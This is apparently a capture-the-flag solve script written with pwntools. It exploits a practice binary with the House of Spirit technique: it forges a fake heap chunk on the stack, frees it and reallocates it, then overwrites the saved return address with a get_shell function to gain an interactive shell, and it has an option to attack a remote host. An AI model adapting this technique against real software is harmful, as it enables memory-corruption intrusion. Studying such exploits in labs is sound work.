#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('house_of_spirit_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def create(size, data):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b":", str(size).encode())
    io.sendlineafter(b":", data)

def delete(ptr):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b":", str(ptr).encode())


def forgeChunk():
    mchunk_prev_size = 0
    mchunk_size = 0x91
    data = flat(
        [
            mchunk_prev_size,
            mchunk_size
        ]
    )

    return data.ljust(31, b"A")

def solve():

    io.sendafter(b":", forgeChunk())
    data = io.recvline().split(b":")[0][1:]
    stack = int(data, 16)
    info("saved rip: %#x", stack)

    create(0x80, b"A"*0x80)
    delete(stack + 0x10)

    offset = 40
    payload = flat({
        offset: [
            exe.sym["get_shell"]
        ]
    })
    
    create(0x80, payload)

    io.sendlineafter(b">", b"3")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

